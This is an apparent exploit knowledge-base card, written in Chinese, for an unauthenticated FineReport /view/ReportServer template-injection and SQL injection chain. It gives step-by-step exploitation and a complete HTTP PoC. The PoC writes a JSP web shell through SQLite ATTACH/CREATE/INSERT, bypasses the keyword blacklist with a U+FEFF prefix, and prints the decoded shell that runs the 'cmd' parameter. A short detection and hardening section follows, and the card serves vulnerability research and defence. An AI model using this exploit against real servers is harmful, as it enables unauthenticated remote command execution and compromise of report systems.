---
id: web-java-component-finereport-view-reportserver-template-sqli-webshell
title: FineReport /view/ReportServer 把 query string 当模板渲染，${sql()} 注入 SQLite 写 JSP
type: scenario
domain: web
path: web/java/component
technique: finereport-view-reportserver-url-template-sqli-sqlite-file-write
tags:
- java
- finereport
- sqli
- template-injection
- sqlite
- arbitrary-file-write
- webshell
- waf-bypass
cve: []
severity: critical
confidence: high
affected_versions: FineReport 11.0.1 - 11.0.28；推断 FineBI 6.0 - 6.0.18 / 6.1.0 - 6.1.1，FineDataLink 4.0.1 - 4.0.30 / 4.1 - 4.1.11
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V34
  verified_at: '2026-11-05T06:07:02+08:00'
  notes: 已对照原文核对：query string 模板渲染注入、sql-FRDemo 堆叠、SQLite ATTACH/CREATE/INSERT 写 JSP、U+FEFF 绕过 attach 黑名单、Jasper 初始化器均与原文一致。未验证点：该节 POC 为引用/构造，无最终 webshell 回显截图，未在本机复现；原文 POC 路由 /decision/view/ReportServer 与路由分析中 /decision/view/report 命名不同，卡内按原文 POC 记录。
url: /docs/web/java/component/web-java-component-finereport-view-reportserver-template-sqli-webshell/
draft: false
kb_aliases:
- FineReport /view/ReportServer SQL 注入
- 帆软 ReportServer 模板注入
- view/ReportServer 写 webshell
- FineReport DECODE 绕过 URL 限制
- FRDemo U+FEFF 堆叠写文件
---

## 一句话结论

FineReport 的 `/webroot/decision/view/ReportServer?` 会把整个 query string 当模板交给 `ReportDispatcher.dealWithRequest` 渲染；攻击者直接在 URL 里写 `${sql('FRDemo',DECODE('...'),1,1)}`，用内置 `DECODE` 把空格/引号等特殊字符带进 GET 参数，再用 SQLite `ATTACH DATABASE` + `CREATE TABLE` + `INSERT` 把 JSP 写入 `webapps/webroot`，最后加载 Jasper 解析器即可获得未认证 WebShell。

## 原理

- `/webroot/decision/view/ReportServer` 由 Spring DispatcherServlet 分发到 `com.fr.web.controller.ReportRequestService`（`@RequestMapping("/view/report")`），其 `preview()` 继承 `AbstractRequestService.handle` → `ReportDispatcher.dealWithRequest`。
- 该处理链会把请求 URL/参数作为模板上下文的一部分交给 FineReport 的模板渲染；URL 中的 `${...}` 会被求值，`${sql(connectionName, sql, columnIndex, rowIndex)}` 是内置 SQL 函数（`FRDemo` 为自带 SQLite 测试库）。
- GET 的 query string 由 Tomcat 原样解析（`getQueryString` 不预先解码），但 URL 中不能直接出现双引号和空格等字符。FineReport 内置 `DECODE()` 函数可做 URL 解码，因此把整段 SQL 先 URL 编码再放进 `DECODE('...')`，即可把空格、单引号、分号等带回 SQL。
- 写文件原语同样依赖 SQLite：
  ```sql
  ATTACH DATABASE '../webapps/webroot/test.jsp' AS test1;
  CREATE TABLE test1.exp(data text);
  INSERT INTO test1.exp(data) VALUES (x'<JSP hex>');
  ```
  三个 `${sql(...)}` 依次执行即可把 JSP 写入 Web 根。
- 黑名单绕过：SQL 检查会把引号内内容移除后按带前后空格的关键词（`" attach "` 等）匹配；SQLite 会忽略语句开头的 U+FEFF（`%EF%BB%BF`），因此让 `DECODE` 后的 SQL 以 U+FEFF 开头，`﻿ATTACH` 前没有空格，黑名单匹配失败，而 SQLite 执行时自动去掉 U+FEFF。
- 该链不要求先获取 sessionID，属于直接的前台注入；若 `/decision` 侧被拦截，还可尝试 `/webroot/ReportServer` 直达 `ReportDispatcher`（该 servlet 不经过 Spring 拦截器），两者最终调用同一 `dealWithRequest`。

## 触发条件

- FineReport 11.0.1–11.0.28（原文；FineBI/FineDataLink 版本为按更新日志推断）。
- 可使用默认 `FRDemo` SQLite 连接，或任意允许堆叠与 `ATTACH` 的 SQLite 数据源。
- Web 进程对 `webapps/webroot` 可写；容器能解析 `.jsp`。
- `/webroot/decision/view/ReportServer`（或 `/webroot/ReportServer`）可达且未在网关层拦截 `${` / `sql(`。

## 利用步骤

1. 用只读 SQL 验证表达式求值，例如 `${sql('FRDemo','select 1',1,1)}`，或带 `DECODE` 的版本。
2. 构造三段 SQL 并分别 URL 编码，套进 `DECODE('%EF%BB%BF...')`：
   - `ATTACH DATABASE '../webapps/webroot/test.jsp' AS test1;`
   - `CREATE TABLE test1.exp(data text);`
   - `INSERT INTO test1.exp(data) VALUES (x'<JSP 十六进制>');`
3. 依次拼在同一个 URL 的 query string 中：`${sql('FRDemo',DECODE('...'),1,1)}${sql(...)}${sql(...)}`。
4. 发送 GET 请求；每次创建新文件时 `AS` 后的数据库别名不能重复。
5. 访问 `/webroot/decision/file?path=org.apache.jasper.servlet.JasperInitializer&type=class` 初始化 Jasper。
6. 访问写入的 JSP 并执行命令。

## PoC

原文 POC（为便于阅读做了可读化，实际发送前需 URL 编码；完整编码串见原文章节）：

```http
GET /webroot/decision/view/ReportServer?${sql('FRDemo',DECODE('%EF%BB%BFATTACH%20DATABASE%20%27..%2Fwebapps%2Fwebroot%2Ftest.jsp%27%20as%20test1%3B'),1,1)}${sql('FRDemo',DECODE('%EF%BB%BFCREATE%20TABLE%20test1.exp%28data%20text%29%3B'),1,1)}${sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20test1.exp%28data%29%20VALUES%20%28x%273c252052756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229293b20253e%27%29%3B'),1,1)} HTTP/1.1
Host: target:8075
Accept: */*
```

JSP 解码后为：

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

加载 JSP 引擎：

```http
GET /webroot/decision/file?path=org.apache.jasper.servlet.JasperInitializer&type=class HTTP/1.1
Host: target:8075
```

## 变体与关联

- 入口变体：`/webroot/ReportServer?` 同样进入 `ReportDispatcher.dealWithRequest`，且绕过 Spring 拦截器；参数形态按 servlet 侧调整。
- 编码变体：`DECODE` 可叠加 URL 编码；也可配合 CJK 编码（`[24][7B]`）绕过 WAF，FineReport 的参数处理会做 CJK + URL 双层解码。
- 关联：[[web-java-component-finereport-print-ie-pdf-sqli-webshell]]（同产品 header `sessionID` 模板注入，影响版本更晚）；[[web-java-component-finereport-reportserver-hsql-param-rce]]（同产品 HSQL `CREATE ALIAS` 命令执行链）。
- 关联：[[web-generic-sqli-mysql-outfile-general-log-webshell]]（SQL 堆叠写 WebShell 的通用思路）。

## 检测与防御

- 检测：`/view/ReportServer` 或 `/ReportServer` 的 query string 出现 `${`、`sql(`、`DECODE(`、`ATTACH`、`CREATE TABLE`、`x'` 等；URL 中出现 U+FEFF 的 `%EF%BB%BF`；同一 URL 连续多条 SQL 表达式。
- 检测：`fanruan.log` 出现 `SQL function:`、`ATTACH`、SQLite 文件锁异常；`webapps/webroot` 新增 `.jsp` 文件。
- 防御：升级到修复版本（FineReport 11.0.29+ 等，具体以官方补丁为准）；模板渲染前对外部参数做转义，禁止 URL 参数进入模板表达式。
- 防御：`SQL` 函数禁止堆叠与非 SELECT 语句；SQL 检查先剥离 U+FEFF 等不可见字符；限制 `ATTACH DATABASE`。
- 加固：Web 根目录禁止写入/执行上传文件；部署官方安全插件；WAF 对 URL 多层解码后再匹配。
